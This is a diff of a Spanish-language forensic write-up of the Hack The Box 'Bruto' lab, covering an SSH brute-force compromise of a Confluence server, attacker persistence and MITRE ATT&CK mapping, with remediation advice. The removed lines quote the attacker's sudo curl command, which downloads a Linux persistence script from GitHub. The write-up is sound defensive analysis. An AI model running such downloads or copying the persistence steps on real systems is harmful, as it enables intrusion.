@@ -1,33 +1,43 @@
-Reporte de Análisis: Sherlock - Bruto (HTB)
+# 🕵️ Análisis de Incidentes: Sherlock - Bruto (DFIR)
 
-## 1. Escenario del Incidente
-Se investigó un compromiso en un servidor **Confluence** basado en Unix. El objetivo fue rastrear las acciones de un atacante que logró acceso mediante fuerza bruta al servicio SSH y analizar sus tácticas de persistencia y ejecución.
+## 📌 Descripción del Caso
+Investigación de un compromiso de seguridad en un servidor **Confluence** basado en Unix. El análisis se centró en identificar el origen de un ataque de fuerza bruta exitoso sobre el servicio SSH, documentando las acciones del atacante para asegurar su acceso y la descarga de herramientas sospechosas.
 
-## 2. Resumen de Hallazgos
+## 🛡️ Resumen Ejecutivo
+* **Activo Afectado:** Servidor Confluence (Linux).
+* **Vector de Entrada:** Ataque de fuerza bruta (Brute Force) sobre el puerto 22 (SSH).
+* **Cuenta Comprometida:** `root`.
+* **Impacto:** Creación de una cuenta de acceso secundaria y descarga de scripts externos.
 
-| Ítem | Información Identificada |
-| :--- | :--- |
-| **Vector de Ataque** | Fuerza Bruta (SSH) |
-| **IP del Atacante** | 65.2.161.68 |
-| **Usuario Comprometido** | root |
-| **Timestamp de Acceso (wtmp)** | 2024-03-06 06:32:45 |
-| **ID de Sesión SSH** | 37 |
-| **Cuenta de Persistencia** | cyberjunkie |
-| **Comando de Descarga (Sudo)** | /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh |
+---
 
-## 3. Análisis Técnico (Metodología)
+## 🛠️ Metodología de Análisis
 
-### Acceso Inicial y Autenticación
-El análisis comenzó en el archivo `auth.log`, donde se identificó un patrón de intentos fallidos masivos provenientes de una única IP. 
-Se confirmó el éxito del ataque al encontrar el evento `Accepted password`. Para mayor precisión, se consultó el artefacto `wtmp`, 
-que permitió diferenciar los intentos automatizados de la sesión interactiva real establecida por el atacante.
+### 1. Identificación de Acceso Inicial
+El análisis comenzó revisando el archivo de logs de autenticación `/var/log/auth.log`. Se detectó un volumen inusual de intentos fallidos de inicio de sesión seguidos de un evento `Accepted password` para el usuario `root`, lo que confirma que el atacante logró adivinar la contraseña mediante un ataque automatizado.
+* **Validación:** Se utilizó el archivo `wtmp` para identificar el tiempo de conexión y confirmar que la sesión fue interactiva (el atacante estuvo operando manualmente el servidor).
 
-### Persistencia y Elevación de Privilegios
-Tras ganar acceso, el atacante ejecutó comandos para crear un nuevo usuario con privilegios de administrador. 
-Esta es una técnica clásica de **Persistencia** para mantener el acceso incluso si la contraseña de la cuenta original es cambiada. 
-Finalmente, se detectó el uso de `sudo` para descargar herramientas externas, lo cual indica una fase de preparación para acciones posteriores.
+### 2. Análisis de Persistencia
+Una vez dentro, el atacante buscó una forma de no perder el acceso:
+* **Creación de Cuenta Secundaria:** Se identificó en los logs la creación de un nuevo usuario con permisos de administrador. Esto permite al atacante volver a entrar incluso si se cambia la contraseña de `root`.
 
-## 4. Tácticas MITRE ATT&CK Detectadas
-* **Acceso a Credenciales:** T1110 - Brute Force.
-* **Persistencia:** T1136.001 - Local Account.
-* **Escalada de Privilegios:** T1548.003 - Sudo and Sudo Caching.
+### 3. Descarga de Archivos Sospechosos
+Mediante la revisión de los comandos ejecutados (`history`) y los logs de `sudo`, se detectó que el atacante utilizó la herramienta `curl` para descargar un script desde un repositorio externo. El script fue alojado en carpetas temporales para evitar su detección inmediata.
+
+---
+
+## 📊 Mapeo de Técnicas (MITRE ATT&CK)
+
+| Táctica | Técnica | ID |
+| :--- | :--- | :--- |
+| **Acceso a Credenciales** | Brute Force (SSH) | T1110 |
+| **Persistencia** | Local Account (Creación de usuario) | T1136.001 |
+| **Mando y Control** | Ingress Tool Transfer (Descarga de scripts) | T1105 |
+
+---
+
+## 🔍 Recomendaciones de Remediación
+
+* **Gestión de Cuentas:** Realizar un cambio inmediato de la contraseña de `root` por una clave robusta. Es fundamental identificar y eliminar la cuenta de usuario creada por el atacante para cortar su vía de acceso secundaria.
+* **Restricción de Acceso SSH:** Configurar el servidor para prohibir el inicio de sesión directo con el usuario `root`. Se recomienda forzar el uso de una cuenta de usuario estándar para la conexión inicial, reduciendo la exposición de la cuenta con máximos privilegios.
+* **Limpieza del Sistema:** Localizar y borrar cualquier archivo o script descargado por el atacante en directorios como `/tmp/` o carpetas de usuario. Esto asegura que no queden herramientas maliciosas residentes en el disco.
